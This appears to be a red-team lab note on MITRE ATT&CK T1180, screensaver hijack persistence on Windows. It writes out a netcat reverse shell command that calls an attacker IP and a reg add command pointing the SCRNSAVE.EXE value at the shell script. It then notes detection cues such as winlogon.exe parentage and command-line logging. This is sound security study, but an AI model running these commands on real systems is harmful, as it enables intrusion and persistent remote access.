---
description: Hijacking screensaver for persistence.
---

# T1180: Screensaver Hijack

## Execution

Attacker has a binary that upon execution sends him a reverse shell. To achieve persistence, the attacker can hijack the `SCRNSAVE.EXE` value in `HKCU\Control Panel\Desktop\` to point it to his payload. In my test, I used a netcat reverse shell:

{% code-tabs %}
{% code-tabs-item title="c:\\shell.cmd@victim" %}
```bash
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
{% endcode-tabs-item %}
{% endcode-tabs %}

For simplicity of this exercise, I am using regedit to update the registry \(as if the attacker got the RDP access\):

![](../.gitbook/assets/screensaver-registry.png)

The same could be achieved using a native windws binary reg.exe:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\shell.cmd
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screensaver-reg.png)

## Observations

Note the process ancestry on the victim system - the reverse shell process traces back to winlogon.exe as the parent process, which is responsible for managing user logons/logoffs - this process ancestry is highly suspect and should make you want to investigate machine further:

![](../.gitbook/assets/screensaver-shell%20%281%29.png)

Commandline line argument monitoring:

![](../.gitbook/assets/screensaver-logs.png)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1180\",\"type\":\"link\",\"title\":\"Screensaver - ATT&CK for Enterprise\"}" %}



